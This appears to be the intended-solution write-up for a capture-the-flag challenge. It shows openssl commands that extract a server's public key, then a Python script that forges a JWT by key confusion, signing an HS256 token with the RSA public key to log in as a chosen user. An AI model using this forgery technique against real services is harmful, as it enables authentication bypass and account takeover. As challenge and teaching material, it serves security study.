# Intended solution

1. Download the certificate from the server
```
echo | openssl s_client -showcerts -servername hackerschallenge.org -connect <SERVER>:8090 2>/dev/null | openssl x509 -inform pem > certificate.pem
```

2. Get the public key from the certificate
```
openssl x509 -pubkey -noout -in certificate.pem  > pubkey.pem    
```
3. There are two ways to get the right signature: you can install JSON Web Token Attacker in Burp Suite, then send a modified JWT with a wrong signature, and perform a key confusion with JOSEPH. Or you can use the following python script:

```python
import hashlib
import hmac
import base64

header = base64.b64encode('{"alg":"HS256","typ":"JWT"}'.encode())
payload = base64.b64encode('{"loggedin":true,"username":"santiago"}'.encode())

plaintext = str(header, "utf-8") + "." + str(payload, "utf-8")

key = open("pubkey.pem","r").read()

signature = hmac.new(key.encode(), plaintext.encode(), hashlib.sha256).digest()


result = plaintext + "." + str(base64.b64encode(signature), "utf-8")
print(result.replace("=", ""))
```